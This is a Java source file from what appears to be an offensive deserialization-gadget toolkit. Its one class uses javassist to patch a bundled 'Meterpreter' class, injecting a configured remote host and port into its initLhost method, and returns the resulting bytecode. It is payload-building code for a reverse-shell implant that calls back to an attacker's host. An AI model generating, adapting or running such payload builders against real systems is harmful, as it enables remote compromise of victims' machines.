package com.qi4l.JYso.gadgets.utils;

import com.qi4l.JYso.gadgets.Config.Config;
import javassist.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Paths;

public class ClassByteChange {

    private static final Logger log = LoggerFactory.getLogger(ClassByteChange.class);

    public static void main(String[] args) {
        try {
            update();
        } catch (NotFoundException | CannotCompileException | IOException e) {
            log.error("e: ", e);
        }
    }

    //动态获取.class
    public static byte[] update() throws NotFoundException, CannotCompileException, IOException {

        File dir = new File("");
        String ap = dir.getAbsolutePath();
        ap = ap + File.separatorChar + "data";
        ClassPool cPool = new ClassPool(true);

        //设置class文件的位置
        cPool.insertClassPath(ap);

        cPool.importPackage("java.io.DataInputStream");
        cPool.importPackage("java.io.InputStream");
        cPool.importPackage("java.net.Socket;");
        cPool.importPackage("java.io.OutputStream");
        cPool.importPackage("java.util.HashMap");
        //获取该class对象
        CtClass cClass = cPool.get("Meterpreter");
        //获取到对应的方法
        CtMethod cMethodHost = cClass.getDeclaredMethod("initLhost");

        cMethodHost.setBody("{        this.host = \"" + Config.rhost + "\";\n" +
                "        this.port = \"" + Config.rport + "\";}");

        //替换原有的文件
        cClass.writeFile(ap);
        InputStream in = Files.newInputStream(Paths.get(ap + File.separatorChar + "Meterpreter.class"));
        return Utils.getBytes(in);


    }
}
